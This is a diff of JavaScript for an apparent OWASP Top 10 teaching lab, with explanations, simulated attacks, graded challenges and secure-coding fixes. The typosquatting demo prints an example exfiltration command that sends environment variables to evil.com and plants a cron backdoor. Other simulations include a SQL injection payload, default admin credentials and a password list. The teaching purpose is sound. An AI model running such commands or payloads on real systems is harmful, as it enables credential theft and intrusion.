+        return {grade:'wrong',msg:'Run the simulation to find which password was guessed. Then think: what would have stopped the attacker from making thousands of guesses?'};
+      }
+    },
+    fix:{
+      summary:'Protect authentication endpoints with rate limiting, lockouts, and MFA. Make brute force computationally impractical.',
+      pseudo:`<span class="cmt"># VULNERABLE — no protection</span>
+<span class="kw">def</span> <span class="fn">login</span>(username, password):
+    user = db.get_user(username)
+    <span class="kw">if</span> user.password == hash(password):
+        <span class="kw">return</span> create_session(user)
+
+<span class="cmt"># SECURE — multiple layers</span>
+<span class="kw">def</span> <span class="fn">login</span>(username, password, ip):
+    rate_limiter.check(ip)          <span class="cmt"># 5 req/min</span>
+    lockout.check(username)         <span class="cmt"># 10 fails → 30min lock</span>
+    user = db.get_user(username)
+    <span class="kw">if</span> <span class="kw">not</span> argon2.verify(password, user.hash):
+        lockout.record_failure(username)
+        <span class="kw">raise</span> Unauthorized
+    mfa.verify(user, request.totp)  <span class="cmt"># second factor</span>`,
+      points:['Rate-limit login attempts per IP and per username','Lock accounts after repeated failures (e.g. 10 fails → 30 min lockout)','Require MFA for all accounts, especially administrators','Use secure session tokens (random, 128-bit, short-lived, HTTP-only cookies)']
+    }
+  },
+  {
+    badge:'A08',name:'Software/Data Integrity Failures',short:'SWID',
+    tagline:'Trusting code you haven\'t verified',
+    explanation:{
+      what:'The application installs updates, runs pipelines, or deserializes data without verifying authenticity — a tampered artifact gets installed.',
+      example:'A software updater downloads an update over HTTP and installs it without checking a signature. An attacker intercepts and replaces it with malware.',
+      where:'Auto-updaters, CI/CD pipelines, npm/pip packages, deserialized objects — any artifact that moves through a pipeline without verification.'
+    },
+    challenge:{
+      task:'In the simulation, compare installing a signed vs unsigned update. What specific check prevents the malicious update? Why is downloading over HTTP a problem even if the update is "the right file"?',
+      hints:['Cryptographic signatures let you verify who created a file','HTTP can be intercepted — HTTPS with certificate verification prevents this','Even the right file from the right server can be replaced in transit without signature verification'],
+      check:(ans)=>{
+        const a=ans.toLowerCase();
+        const hasCheck = a.includes('signature')||a.includes('hash')||a.includes('sign')||a.includes('verif')||a.includes('checksum');
+        const hasHTTP = a.includes('http')||a.includes('intercept')||a.includes('mitm')||a.includes('man-in')||a.includes('in-transit')||a.includes('tls')||a.includes('https');
+        if(hasCheck&&hasHTTP) return {grade:'correct',msg:"Correct. A cryptographic signature (checked against a trusted public key) ensures the file came from the real developer. HTTP allows a man-in-the-middle to swap the file entirely — HTTPS + signature verification together prevent this."};
+        if(hasCheck) return {grade:'partial',msg:'Good — signatures are key. But also explain: why is the HTTP download itself a problem?'};
+        if(hasHTTP) return {grade:'partial',msg:"Right about HTTP. But what specific cryptographic check should happen AFTER downloading — even over HTTPS?"};
+        return {grade:'wrong',msg:'Run both simulations (unsigned vs signed). Focus on: what check happens in the secure version? Why does the download channel matter?'};
+      }
+    },
+    fix:{
+      summary:'Every artifact that enters your system must be cryptographically signed and verified before use.',
+      pseudo:`<span class="cmt"># VULNERABLE — no verification</span>
+update = http.get(<span class="str">"http://updates.example.com/app.pkg"</span>)
+install(update)
+
+<span class="cmt"># SECURE — signed, verified</span>
+update = https.get(<span class="str">"https://updates.example.com/app.pkg"</span>)
+sig    = https.get(<span class="str">"https://updates.example.com/app.sig"</span>)
+<span class="kw">if not</span> verify_signature(update, sig, TRUSTED_PUBLIC_KEY):
+    <span class="kw">raise</span> <span class="fn">SecurityError</span>(<span class="str">"Signature invalid — refusing install"</span>)
+install(update)`,
+      points:['Sign all software artifacts with code-signing certificates','Verify signatures before installing any update or package','Use HTTPS for all artifact downloads — never plain HTTP','Protect CI/CD pipelines: restrict who can push to production','Generate and publish a Software Bill of Materials (SBOM)']
+    }
+  },
+  {
+    badge:'A09',name:'Security Logging & Alerting Failures',short:'Logging',
+    tagline:'If you can\'t see an attack, you can\'t stop it',
+    explanation:{
+      what:'The application fails to log security events or alert on suspicious activity, so attacks go undetected for weeks or months.',
+      example:'An attacker runs a SQL injection campaign against a site. 2,000 failed requests happen. No logs are written. No alert fires. The breach is discovered 3 months later.',
+      where:'Login endpoints, admin actions, API calls, errors — any event that could indicate malicious activity if captured and analyzed.'
+    },
+    challenge:{
+      task:'Run the attack in the simulation without logging, then enable logging and run again. What specific events should be logged? What makes a log entry useful (not just present)?',
+      hints:['An alert without context is useless — think about what information helps an analyst respond','Failed logins, unusual data volumes, and error spikes are all signals','A log needs: timestamp, user/IP, action, outcome, and severity'],
+      check:(ans)=>{
+        const a=ans.toLowerCase();
+        const hasEvents = a.includes('login')||a.includes('fail')||a.includes('auth')||a.includes('error')||a.includes('attempt')||a.includes('request')||a.includes('event');
+        const hasQuality = a.includes('timestamp')||a.includes('ip')||a.includes('user')||a.includes('context')||a.includes('who')||a.includes('when')||a.includes('what')||a.includes('detail')||a.includes('severity');
+        if(hasEvents&&hasQuality) return {grade:'correct',msg:'Excellent. Logging the right events (auth failures, anomalies, errors) WITH context (who, when, what IP, what action, outcome) is what makes logs actionable. A log with no IP or timestamp is nearly useless.'};
+        if(hasEvents) return {grade:'partial',msg:"Good events to log! But what makes a log entry actually useful? What information does it need to include?"};
+        if(hasQuality) return {grade:'partial',msg:'Good thinking about quality. But also: which security events specifically should trigger a log entry?'};
+        return {grade:'wrong',msg:'Compare the two simulation runs — what was visible with logging enabled that wasn\'t without it? And what details does each log entry include?'};
+      }
+    },
+    fix:{
+      summary:'Log security-relevant events with enough context to reconstruct an attack. Alert on thresholds. Store logs where attackers can\'t delete them.',
+      pseudo:`<span class="cmt"># VULNERABLE — silent failures</span>
+<span class="kw">except</span> LoginFailed:
+    <span class="kw">pass</span>  <span class="cmt"># exception swallowed, nothing logged</span>
+
+<span class="cmt"># SECURE — structured, actionable logs</span>
+<span class="kw">except</span> LoginFailed <span class="kw">as</span> e:
+    logger.warning({
+        <span class="str">"event"</span>: <span class="str">"auth.failure"</span>,
+        <span class="str">"username"</span>: username,
+        <span class="str">"ip"</span>: request.ip,
+        <span class="str">"timestamp"</span>: now(),
+        <span class="str">"reason"</span>: str(e)
+    })
+    siem.alert_if_threshold(ip, window=<span class="str">"5min"</span>, limit=<span class="num">10</span>)`,
+      points:['Log authentication failures, access control violations, and input validation errors','Include timestamp, user, IP, action, and outcome in every log entry','Store logs in a separate, tamper-evident system (SIEM)','Set alerts for anomaly thresholds — e.g. 10 failures in 5 minutes']
+    }
+  },
+  {
+    badge:'A10',name:'Exceptional Condition Handling',short:'Exceptions',
+    tagline:'Errors that accidentally grant access',
+    explanation:{
+      what:'When the application encounters an unexpected input or error, it handles it insecurely — either revealing sensitive info or "failing open" (granting access on error).',
+      example:'A bank transfer function throws an exception with a negative amount. The catch block defaults to "success" instead of "fail". The attacker gains funds.',
+      where:'Financial calculations, authentication checks, API parsers, numeric inputs — any code that can receive unexpected values and has a try/catch.'
+    },
+    challenge:{
+      task:'Send the negative transfer in the simulation. Observe the outcome. Explain: what is "fail-open" vs "fail-closed" behavior, and which is appropriate for security controls?',
+      hints:['Fail-open means: on error, allow access/action. Fail-closed means: on error, deny.','For a bank transfer, an exception should stop the transfer, not approve it','For a door lock, a power failure should keep the door LOCKED (fail-closed)'],
+      check:(ans)=>{
+        const a=ans.toLowerCase();
+        const hasOpen = a.includes('fail-open')||a.includes('fail open')||a.includes('allow')||a.includes('grant')||a.includes('approve');
+        const hasClosed = a.includes('fail-closed')||a.includes('fail closed')||a.includes('deny')||a.includes('block')||a.includes('reject');
+        const hasContext = a.includes('security')||a.includes('safe')||a.includes('default')||a.includes('should')||a.includes('correct')||a.includes('bank')||a.includes('transfer');
+        if(hasOpen&&hasClosed&&hasContext) return {grade:'correct',msg:'Perfect. Fail-open grants access on error (dangerous for security controls). Fail-closed denies access on error (correct for security). Security decisions must always default to the safe, restrictive option when something goes wrong.'};
+        if((hasOpen||hasClosed)&&hasContext) return {grade:'partial',msg:"You're partly there. Define BOTH terms precisely, then say which is correct for security-critical code and why."};
+        return {grade:'wrong',msg:"Run the simulation and observe: what happened when the negative transfer caused an error? Should that outcome have been 'success' or 'failure'? That's the fail-open vs fail-closed question."};
+      }
+    },
+    fix:{
+      summary:'Security-critical code must fail closed — deny, block, or reject on any unexpected condition. Never let an error grant access.',
+      pseudo:`<span class="cmt"># VULNERABLE — fail-open (dangerous!)</span>
+<span class="kw">try</span>:
+    <span class="kw">if</span> authorize(user, resource):
+        <span class="kw">return</span> allow()
+<span class="kw">except</span> Exception:
+    <span class="kw">return</span> allow()  <span class="cmt"># ERROR: grants access on failure!</span>
+
+<span class="cmt"># SECURE — fail-closed</span>
+<span class="kw">try</span>:
+    <span class="kw">if</span> amount <= <span class="num">0</span> <span class="kw">or</span> amount > MAX_TRANSFER:
+        <span class="kw">raise</span> <span class="fn">ValueError</span>(<span class="str">"Invalid amount"</span>)
+    process_transfer(amount)
+<span class="kw">except</span> Exception <span class="kw">as</span> e:
+    logger.error(e)
+    <span class="kw">return</span> deny()  <span class="cmt"># Always deny on unexpected error</span>`,
+      points:['Default to deny/reject in all exception handlers for security code','Validate input ranges explicitly before processing (negative, overflow, NaN)','Never expose stack traces or internal errors to users','Test error paths and boundary conditions as part of security review']
+    }
+  }
+];
+
+let selectedVuln = null;
+let currentTab = 0;
+let completedTabs = new Set();
+let bruteTimer = null;
+
+// ===== HOME =====
+function renderHome(){
+  const grid = document.getElementById('vuln-grid');
+  grid.innerHTML = VULNS.map((v,i)=>`
+    <div class="vcard" id="vcard-${i}" onclick="selectVuln(${i})">
+      <div class="vcard-badge">${v.badge}</div>
+      <h3>${v.name}</h3>
+      <p>${v.tagline}</p>
+      <span class="vcard-arrow">→</span>
+    </div>`).join('');
+}
+
+function selectVuln(i){
+  selectedVuln = i;
+  document.querySelectorAll('.vcard').forEach((c,j)=>c.classList.toggle('selected',j===i));
+  const btn = document.getElementById('start-btn');
+  btn.disabled = false;
+  btn.textContent = `Explore ${VULNS[i].badge}: ${VULNS[i].name} →`;
+}
+
+function startLab(){
+  if(selectedVuln===null) return;
+  document.getElementById('home').style.display='none';
+  const lab = document.getElementById('lab');
+  lab.style.display='flex';
+  lab.style.flexDirection='column';
+  completedTabs = new Set();
+  currentTab = 0;
+  loadLab(selectedVuln);
+}
+
+function goHome(){
+  document.getElementById('lab').style.display='none';
+  document.getElementById('home').style.display='flex';
+  document.getElementById('home').style.flexDirection='column';
+  if(bruteTimer) clearInterval(bruteTimer);
+}
+
+// ===== LAB =====
+function loadLab(i){
+  const v = VULNS[i];
+  document.getElementById('lab-badge').textContent = v.badge;
+  document.getElementById('lab-title').textContent = v.name;
+  renderProgress();
+  showTab(0);
+  renderTab(0,v);
+}
+
+function renderProgress(){
+  const prog = document.getElementById('lab-progress');
+  prog.innerHTML = [0,1,2,3].map(i=>`<div class="prog-dot ${completedTabs.has(i)?'done':currentTab===i?'active':''}" id="pd-${i}"></div>`).join('');
+}
+
+function showTab(n){
+  [0,1,2,3].forEach(i=>{
+    document.getElementById('tab-content-'+i).style.display = i===n?'block':'none';
+    const t = document.getElementById('tab-'+i);
+    t.classList.toggle('active',i===n);
+    t.classList.toggle('done',completedTabs.has(i)&&i!==n);
+  });
+  currentTab = n;
+  renderProgress();
+  renderTab(n, VULNS[selectedVuln]);
+}
+
+function markDone(tab){
+  completedTabs.add(tab);
+  document.getElementById('pd-'+tab).classList.replace('active','done');
+  document.getElementById('tab-'+tab).classList.add('done');
+}
+
+function renderTab(n, v){
+  const el = document.getElementById('tab-content-'+n);
+  if(n===0) el.innerHTML = renderExplanation(v);
+  else if(n===1) el.innerHTML = renderSim(v);
+  else if(n===2) el.innerHTML = renderChallenge(v);
+  else if(n===3) el.innerHTML = renderFix(v);
+}
+
+// ===== EXPLANATION =====
+function renderExplanation(v){
+  return `
+    <div class="sec-title">${v.badge}: ${v.name}</div>
+    <div class="sec-sub">What it is, how it works, and where it appears</div>
+
+    <div class="info-card">
+      <div class="info-label">What it is</div>
+      <div class="info-text">${v.explanation.what}</div>
+    </div>
+    <div class="info-card">
+      <div class="info-label">A simple example</div>
+      <div class="info-text">${v.explanation.example}</div>
+    </div>
+    <div class="info-card">
+      <div class="info-label">Where it happens</div>
+      <div class="info-text">${v.explanation.where}</div>
+    </div>
+
+    <div class="sec-nav">
+      <span class="sec-nav-label">Section 1 of 4</span>
+      <button class="btn btn-green" onclick="showTab(1);markDone(0)">Next: Simulation →</button>
+    </div>`;
+}
+
+// ===== SIMULATIONS =====
+function renderSim(v){
+  const sims = {
+    'A01': renderSimIDOR(),
+    'A02': renderSimMisconfig(),
+    'A03': renderSimSCA(),
+    'A04': renderSimCrypto(),
+    'A05': renderSimSQLi(),
+    'A06': renderSimDesign(),
+    'A07': renderSimAuth(),
+    'A08': renderSimIntegrity(),
+    'A09': renderSimLogging(),
+    'A10': renderSimException(),
+  };
+  return `
+    <div class="sec-title">Attack Simulation</div>
+    <div class="sec-sub">Observe and interact — see how the vulnerability is exploited</div>
+    ${sims[v.badge]||'<p>Coming soon.</p>'}
+    <div class="sec-nav">
+      <button class="btn btn-gray" onclick="showTab(0)">← Back</button>
+      <button class="btn btn-green" onclick="showTab(2);markDone(1)">Next: Challenge →</button>
+    </div>`;
+}
+
+function renderSimIDOR(){
+  return `
+    <div class="terminal">
+      <div class="term-hdr"><div class="tdot" style="background:#ff5f57"></div><div class="tdot" style="background:#febc2e"></div><div class="tdot" style="background:#28c840"></div><div class="term-title">HTTP Request Editor</div></div>
+      <div class="term-body">
+        <div><span class="t-prompt">GET</span> <span class="t-url">/api/profile?id=</span><input id="idor-id" class="sim-input" value="101" style="width:70px;display:inline-block;padding:2px 6px"></div>
+        <div><span class="t-key">Authorization:</span> <span class="t-val">Bearer user_101_token</span></div>
+        <div><span class="t-key">Host:</span> <span class="t-val">example-app.com</span></div>
+      </div>
+    </div>
+    <div class="sim-row">
+      <button class="btn btn-red" onclick="runIDOR()">Send Request</button>
+      <button class="btn btn-gray" onclick="resetIDOR()">Reset</button>
+    </div>
+    <div class="result" id="idor-result"></div>
+    <div style="margin-top:20px">
+      <div class="flow-steps" id="idor-flow">
+        <div class="flow-step" id="if-0"><span class="flow-step-num">1.</span> User sends GET request with profile ID</div>
+        <div class="flow-step" id="if-1"><span class="flow-step-num">2.</span> Server extracts ID from request</div>
+        <div class="flow-step" id="if-2"><span class="flow-step-num">3.</span> Server checks: is user authenticated? ✓</div>
+        <div class="flow-step" id="if-3"><span class="flow-step-num">4.</span> Server checks: does user OWN this ID? ✗ skipped</div>
+        <div class="flow-step" id="if-4"><span class="flow-step-num">5.</span> Database returns data for requested ID</div>
+      </div>
+    </div>`;
+}
+
+function runIDOR(){
+  const id = document.getElementById('idor-id').value.trim();
+  const r = document.getElementById('idor-result');
+  if(id==='101'){
+    r.className='result info show';
+    r.innerHTML='Response 200 OK\n{"id":101,"name":"Alice Smith","email":"alice@corp.com","role":"user"}\n\nThis is YOUR own data — valid access.';
+    [0,1,2].forEach(i=>document.getElementById('if-'+i).className='flow-step secure');
+    [3,4].forEach(i=>document.getElementById('if-'+i).className='flow-step');
+  } else if(['102','103','104','105'].includes(id)){
+    const names={102:'Bob Jones',103:'Carol White',104:'Dan Brown',105:'Eve Wilson'};
+    r.className='result success show';
+    r.innerHTML=`⚠ Response 200 OK — Unauthorized access!\n{"id":${id},"name":"${names[id]||'Unknown User'}","email":"user${id}@corp.com","ssn":"XXX-XX-${id}0${id}","salary":"$${(id*12345).toLocaleString()}"}\n\nYou accessed ANOTHER user's private data as user 101.`;
+    [0,1,2].forEach(i=>document.getElementById('if-'+i).className='flow-step secure');
+    document.getElementById('if-3').className='flow-step active';
+    document.getElementById('if-4').className='flow-step active';
+  } else {
+    r.className='result fail show';
+    r.innerHTML=`Response 404 Not Found\n{"error":"User not found"}\n\nID ${id} does not exist in this demo. Try 102–105.`;
+  }
+}
+
+function resetIDOR(){
+  document.getElementById('idor-id').value='101';
+  document.getElementById('idor-result').className='result';
+  [0,1,2,3,4].forEach(i=>document.getElementById('if-'+i).className='flow-step');
+}
+
+function renderSimMisconfig(){
+  return `
+    <div class="info-card" style="margin-bottom:16px">
+      <div class="info-label">Server Configuration (Production)</div>
+      <div style="display:flex;flex-direction:column;gap:0">
+        <div class="tog-row"><span class="tog-label">Default admin credentials (admin:admin)</span><label class="tog"><input type="checkbox" id="mc-default" checked><span class="tog-track"></span></label></div>
+        <div class="tog-row"><span class="tog-label">Debug mode / verbose errors</span><label class="tog"><input type="checkbox" id="mc-debug" checked><span class="tog-track"></span></label></div>
+        <div class="tog-row"><span class="tog-label">Admin panel exposed at /admin</span><label class="tog"><input type="checkbox" id="mc-exposed" checked><span class="tog-track"></span></label></div>
+      </div>
+    </div>
+    <div class="terminal">
+      <div class="term-hdr"><div class="tdot" style="background:#ff5f57"></div><div class="tdot" style="background:#febc2e"></div><div class="term-title">Admin Login — /admin</div></div>
+      <div class="term-body">
+        <div>Username: <input id="mc-user" class="sim-input" value="" placeholder="username" style="width:140px;display:inline-block;padding:2px 8px"></div>
+        <div>Password: <input id="mc-pass" class="sim-input" value="" placeholder="password" type="text" style="width:140px;display:inline-block;padding:2px 8px"></div>
+      </div>
+    </div>
+    <div class="sim-row">
+      <button class="btn btn-red" onclick="runMisconfig()">Attempt Login</button>
+    </div>
+    <div class="result" id="mc-result"></div>`;
+}
+
+function runMisconfig(){
+  const user = document.getElementById('mc-user').value.trim();
+  const pass = document.getElementById('mc-pass').value.trim();
+  const defOn = document.getElementById('mc-default').checked;
+  const expOn = document.getElementById('mc-exposed').checked;
+  const dbg = document.getElementById('mc-debug').checked;
+  const r = document.getElementById('mc-result');
+  if(!expOn){r.className='result info show';r.innerHTML='Admin panel is not exposed — /admin returns 404.';return;}
+  if(defOn && user==='admin' && pass==='admin'){
+    r.className='result success show';
+    r.innerHTML=`⚠ LOGIN SUCCESS — Default credentials accepted!\n\nWelcome, Administrator.\nAccess granted to:\n  /admin/users (${(Math.random()*1000+500|0).toLocaleString()} accounts)\n  /admin/config\n  /admin/db-export\n${dbg?'\nDebug mode ON — internal paths and stack traces visible to attacker.':''}`;
+  } else if(defOn && (user==='admin'||pass==='admin')){
+    r.className='result fail show';
+    r.innerHTML=`Login failed for ${user}:${pass}\n\n${dbg?'Debug: InvalidCredentials at auth.py line 47\n  user query returned: None':'Invalid credentials.'}`;
+  } else if(!defOn && user==='admin' && pass==='admin'){
+    r.className='result fail show';
+    r.innerHTML='Login failed — default credentials have been changed.\n\nThis is correct behavior for a hardened system.';
+  } else {
+    r.className='result fail show';
+    r.innerHTML=`Login failed for "${user}".\n\n${dbg?'Error details exposed (debug mode): User not found in users table':'Invalid credentials.'}`;
+  }
+}
+
+function renderSimSCA(){
+  return `
+    <div class="info-card">
+      <div class="info-label">package.json — dependencies</div>
+      <div class="code-block" style="margin:0">
+<span class="t-cmt">// Installed dependencies</span>
+<span class="t-key">"express"</span>: <span class="t-val">"^4.18.2"</span>,      <span class="t-ok">// ✓ official</span>
+<span class="t-key">"mongoose"</span>: <span class="t-val">"^7.0.0"</span>,      <span class="t-ok">// ✓ official</span>
+<span class="t-key">"jsonwebtoken"</span>: <span class="t-val">"^9.0.0"</span>,  <span class="t-ok">// ✓ official</span>
+<span class="t-key" style="background:rgba(232,64,64,.15);">"lodahs"</span>: <span class="t-val">"^2.4.1"</span>,        <span class="t-err">// ⚠ SUSPICIOUS</span>
+<span class="t-key">"axios"</span>: <span class="t-val">"^1.4.0"</span>,         <span class="t-ok">// ✓ official</span></div>
+    </div>
+    <div class="sim-row">
+      <button class="btn btn-red" onclick="runSCA()">Execute: require('lodahs')</button>
+      <button class="btn btn-green" onclick="runSCASecure()">Check with npm audit</button>
+    </div>
+    <div class="result" id="sca-result"></div>
+    <div class="info-highlight" style="margin-top:16px">
+      <div class="t-cmt">// Postinstall script from lodahs/install.js (hidden)</div>
+      <div class="t-err">exec("curl https://evil.com/exfil?env=$(env|base64)&host=$(hostname)")</div>
+      <div class="t-err">fs.writeFile("/tmp/.cron","*/5 * * * * /tmp/.backdoor")</div>
+    </div>`;
+}
+
+function runSCA(){
+  const r = document.getElementById('sca-result');
+  r.className='result success show';
+  r.innerHTML=`⚠ MALICIOUS DEPENDENCY EXECUTED\n\n[postinstall] lodahs@2.4.1\n  → Exfiltrating environment variables to evil.com\n  → Writing cron backdoor to /tmp/.cron\n  → Sending: DB_PASS=s3cr3t, API_KEY=abc123...\n\nNote: "lodahs" is a typosquatted version of "lodash" — one letter off.\n3,200 developers installed this before it was removed.`;
+}
+
+function runSCASecure(){
+  const r = document.getElementById('sca-result');
+  r.className='result info show';
+  r.innerHTML=`npm audit report:\n\n  lodahs@2.4.1\n  ├ Severity: CRITICAL\n  ├ Type: Malicious package (typosquatting "lodash")\n  ├ Action: REMOVE IMMEDIATELY\n  └ CVE: Not applicable — intentionally malicious\n\nFix: Remove "lodahs", install "lodash" (the real package)\nUse: npm install --package-lock-only to verify hashes`;
+}
+
+function renderSimCrypto(){
+  return `
+    <div style="overflow-x:auto">
+    <table class="compare">
+      <tr><th>Username</th><th>Storage Method</th><th>Stored Value</th><th>If leaked?</th></tr>
+      <tr><td>alice</td><td class="bad">MD5 (broken)</td><td class="t-err" style="font-size:11px">5f4dcc3b5aa765d61d8327de</td><td class="bad">Cracked in &lt;1 second</td></tr>
+      <tr><td>bob</td><td class="bad">SHA1 (weak)</td><td class="t-err" style="font-size:11px">5baa61e4c9b93f3f0682250b</td><td class="bad">Cracked in &lt;5 seconds</td></tr>
+      <tr><td>charlie</td><td class="bad">Plaintext (!)</td><td class="t-err">password123</td><td class="bad">Immediate exposure</td></tr>
+      <tr><td>diana</td><td class="good">Argon2id ✓</td><td class="t-ok" style="font-size:11px">$argon2id$v=19$m=65536,t=3...</td><td class="good">~10 years on GPU cluster</td></tr>
+    </table>
+    </div>
+    <div class="sim-row">
+      <button class="btn btn-red" onclick="runCrack()">Crack MD5 Hashes</button>
+      <button class="btn btn-green" onclick="runArgon()">Test Argon2id</button>
+    </div>
+    <div class="result" id="crypto-result"></div>`;
+}
+
+function runCrack(){
+  const r = document.getElementById('crypto-result');
+  r.className='result success show';
+  r.innerHTML=`⚠ MD5 CRACKED — Rainbow table lookup:\n\n  alice: 5f4dcc3b... → "password"\n  bob:   5baa61e4... → "password"\n  charlie: plaintext → "password123"\n\nTime to crack: 0.003 seconds\nTool used: hashcat on GPU (30 billion hashes/sec)\n\nAll three accounts immediately compromised after DB leak.`;
+}
+
+function runArgon(){
+  const r = document.getElementById('crypto-result');
+  r.className='result info show';
+  r.innerHTML=`Argon2id crack attempt:\n\n  diana: $argon2id$v=19$m=65536... → ?\n\nStatus: Running... (estimated time: 200+ years on GPU cluster)\n\nWhy? Argon2id is memory-hard and deliberately slow.\n  - 65 MB of RAM required per attempt\n  - GPU parallelism severely limited\n  - Each guess takes ~300ms, not 0.000003ms\n  - Same password "password" would take decades, not seconds`;
+}
+
+function renderSimSQLi(){
+  return `
+    <div class="terminal">
+      <div class="term-hdr"><div class="tdot" style="background:#ff5f57"></div><div class="term-title">Login Form → Live SQL Query Preview</div></div>
+      <div class="term-body">
+        <div>Username: <input id="sqli-user" class="sim-input" oninput="updateSQL()" value="" placeholder="enter username" style="width:200px;display:inline-block;padding:2px 8px"></div>
+        <div>Password: <input id="sqli-pass" class="sim-input" oninput="updateSQL()" value="" placeholder="enter password" style="width:200px;display:inline-block;padding:2px 8px;margin-top:4px"></div>
+        <div style="margin-top:12px;padding-top:10px;border-top:1px solid var(--bdr2)"><span class="t-cmt">-- Generated SQL:</span></div>
+        <div id="sql-preview" style="font-size:12px;line-height:1.8;word-break:break-all">
+          <span class="t-key">SELECT</span> * <span class="t-key">FROM</span> users <span class="t-key">WHERE</span> username='<span class="t-val" id="sql-u"></span>' <span class="t-key">AND</span> password='<span class="t-val" id="sql-p"></span>'
+        </div>
+      </div>
+    </div>
+    <div class="sim-row">
+      <button class="btn btn-amber" onclick="injectPayload()">Inject: ' OR 1=1 --</button>
+      <button class="btn btn-red" onclick="runSQLi()">Execute Query</button>
+      <button class="btn btn-gray" onclick="resetSQLi()">Reset</button>
+    </div>
+    <div class="result" id="sqli-result"></div>`;
+}
+
+function updateSQL(){
+  const u = document.getElementById('sqli-user').value;
+  const p = document.getElementById('sqli-pass').value;
+  const uEl = document.getElementById('sql-u');
+  const pEl = document.getElementById('sql-p');
+  uEl.textContent = u;
+  pEl.textContent = p;
+  const hasInject = u.includes("'")||p.includes("'");
+  uEl.style.color = hasInject ? 'var(--red)' : 'var(--amber)';
+  pEl.style.color = hasInject ? 'var(--red)' : 'var(--amber)';
+}
+
+function injectPayload(){
+  document.getElementById('sqli-user').value = "' OR 1=1 --";
+  document.getElementById('sqli-pass').value = '';
+  updateSQL();
+}
+
+function runSQLi(){
+  const u = document.getElementById('sqli-user').value;
+  const r = document.getElementById('sqli-result');
+  if(u.toLowerCase().includes("or 1=1")||u.includes("' OR '1'='1")){
+    r.className='result success show';
+    r.innerHTML=`⚠ SQL INJECTION — Authentication bypassed!\n\nFinal query:\n  SELECT * FROM users WHERE username='' OR 1=1 --' AND password=''\n\nWhat happened:\n  1. OR 1=1   → condition is ALWAYS TRUE\n  2. --       → comments out the password check\n  3. Result   → query returns ALL users (1,847 rows)\n  4. Server logs in as first row: admin\n\nLogged in as: admin | Role: ADMINISTRATOR`;
+  } else if(u && p !== undefined){
+    r.className='result fail show';
+    r.innerHTML=`Login failed.\nQuery: SELECT * FROM users WHERE username='${u}'\nReturned 0 rows — user not found or wrong password.`;
+  } else {
+    r.className='result warn show';
+    r.innerHTML='Enter a username and password, or click "Inject" to use the attack payload.';
+  }
+}
+
+function resetSQLi(){
+  document.getElementById('sqli-user').value='';
+  document.getElementById('sqli-pass').value='';
+  updateSQL();
+  document.getElementById('sqli-result').className='result';
+}
+
+function renderSimDesign(){
+  return `
+    <div class="info-card">
+      <div class="info-label">E-Commerce Checkout Flow</div>
+      <div style="display:flex;align-items:center;gap:0;flex-wrap:wrap;margin-top:8px">
+        ${['1. Add to Cart','2. Enter Shipping','3. Payment','4. Confirm Order'].map((s,i)=>`
+          <div id="ds-step-${i}" style="padding:8px 14px;font-size:12px;font-family:var(--mono);background:var(--bg4);border:1px solid var(--bdr2);${i<3?'border-right:none':''}${i===0?'border-radius:6px 0 0 6px':''}${i===3?'border-radius:0 6px 6px 0':''}color:var(--text3)">${s}</div>
+        `).join('')}
+      </div>
+    </div>
+    <div class="terminal">
+      <div class="term-hdr"><div class="tdot" style="background:#ff5f57"></div><div class="term-title">Direct Request</div></div>
+      <div class="term-body">
+        <div><span class="t-prompt">POST</span> <span class="t-url">/api/orders/confirm</span></div>
+        <div><span class="t-key">{"cart_id": "cart_abc123", "step": "confirm"}</span></div>
+        <div class="t-cmt"># No payment token sent — skipping step 3</div>
+      </div>
+    </div>
+    <div class="sim-row">
+      <button class="btn btn-amber" onclick="designFlow()">Follow Normal Flow</button>
+      <button class="btn btn-red" onclick="skipPayment()">Skip to Confirm (Attack)</button>
+    </div>
+    <div class="result" id="design-result"></div>`;
+}
+
+let dFlowStep = 0;
+function designFlow(){
+  const labels=['Add to Cart','Shipping','Payment','Confirmed!'];
+  const colors=['var(--text2)','var(--text2)','var(--text2)','var(--green)'];
+  if(dFlowStep < 4){
+    for(let i=0;i<=dFlowStep;i++){
+      const el=document.getElementById('ds-step-'+i);
+      el.style.background=i===dFlowStep?'var(--green3)':'var(--bg4)';
+      el.style.borderColor=i===dFlowStep?'var(--green2)':'var(--bdr2)';
+      el.style.color=i===dFlowStep?'var(--green)':'var(--text3)';
+    }
+    if(dFlowStep===3){
+      const r=document.getElementById('design-result');
+      r.className='result info show';
+      r.innerHTML='✓ Normal flow complete. Payment was verified at step 3 before confirming.\nOrder total: $149.99 — charged successfully.';
+      dFlowStep=0;
+    } else dFlowStep++;
+  }
+}
+
+function skipPayment(){
+  [0,1,2,3].forEach(i=>{
+    const el=document.getElementById('ds-step-'+i);
+    if(i===3){el.style.background='var(--red3)';el.style.borderColor='var(--red2)';el.style.color='var(--red)';}
+    else {el.style.background='var(--bg4)';el.style.borderColor='var(--bdr2)';el.style.color='var(--text4)';}
+  });
+  const r=document.getElementById('design-result');
+  r.className='result success show';
+  r.innerHTML=`⚠ ORDER PLACED — Payment step bypassed!\n\nPOST /api/orders/confirm → 200 OK\nOrder ID: ORD-9921 confirmed\nItems: MacBook Pro 14" × 1\nTotal charged: $0.00\n\nServer trusted the client-sent "step" parameter\nand never verified that payment was actually completed.`;
+  dFlowStep=0;
+}
+
+function renderSimAuth(){
+  return `
+    <div class="info-card">
+      <div class="info-label">Login Endpoint Configuration</div>
+      <div class="tog-row"><span class="tog-label">Rate limiting (5 req/min)</span><label class="tog"><input type="checkbox" id="auth-rl"><span class="tog-track"></span></label></div>
+      <div class="tog-row"><span class="tog-label">Account lockout after 10 failures</span><label class="tog"><input type="checkbox" id="auth-lo"><span class="tog-track"></span></label></div>
+    </div>
+    <div id="brute-log"><span class="t-cmt"># Ready. Click Start to run credential spray...</span></div>
+    <div class="sim-row" style="align-items:center">
+      <div style="flex:1;font-size:12px;color:var(--text3)">Attempts: <span id="brute-count" style="font-family:var(--mono);color:var(--amber)">0</span></div>
+      <button class="btn btn-red" id="brute-btn" onclick="runBrute()">Start Attack</button>
+      <button class="btn btn-gray" onclick="stopBrute()">Stop</button>
+    </div>
+    <div class="result" id="auth-result"></div>`;
+}
+
+let bruteCount = 0;
+const bruteList = ['password','123456','admin123','qwerty','letmein','welcome','monkey','dragon','pass','baseball'];
+
+function runBrute(){
+  if(bruteTimer) return;
+  bruteCount = 0;
+  const log = document.getElementById('brute-log');
+  log.innerHTML = '';
+  document.getElementById('auth-result').className='result';
+  const rl = document.getElementById('auth-rl').checked;
+  const lo = document.getElementById('auth-lo').checked;
